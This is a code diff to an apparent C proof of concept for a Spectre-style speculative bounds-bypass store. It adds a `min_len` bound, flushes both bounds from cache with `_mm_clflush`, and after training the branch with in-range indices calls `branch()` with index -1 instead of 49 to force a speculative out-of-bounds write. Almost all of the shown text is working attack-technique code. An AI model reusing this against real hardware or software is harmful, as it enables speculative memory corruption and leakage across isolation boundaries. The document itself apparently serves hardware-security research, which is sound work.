@@ -100,11 +100,12 @@ void check_probes() {
 
 // Use Global instead of local for easier flushing?
 int __attribute__((section(".max_len"))) max_len = 43;
+int __attribute__((section(".max_len"))) min_len = 0;
 
-void branch(uint64_t* array, uint64_t entry, int index){
-    if (index < max_len){
-        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
+void branch(uint64_t* array, register entry, register index){
+    if ((index < max_len) && (index >= min_len)) {
         array[index] = entry;
+        asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
         return;
     }
     return;
@@ -117,14 +118,17 @@ void trick_branch(){
     uint64_t good_val = 0xDEADBEEF12345678;
     uint64_t bad_val  = 0x0000000000434040;
 
+    // memset(overflow, 0x44, sizeof(overflow));
     for (i=0; i< training_rounds; i++){
         branch(overflow, good_val, i%43);
     }
-    
+     
     _mm_clflush(&max_len);
+    _mm_clflush(&min_len);
     flush_probe_buf_i();
 
-    branch(overflow, bad_val, 49);
+    branch(overflow, bad_val, -1);
+    // branch(overflow, bad_val, 49);
 }
 
 void measure() {
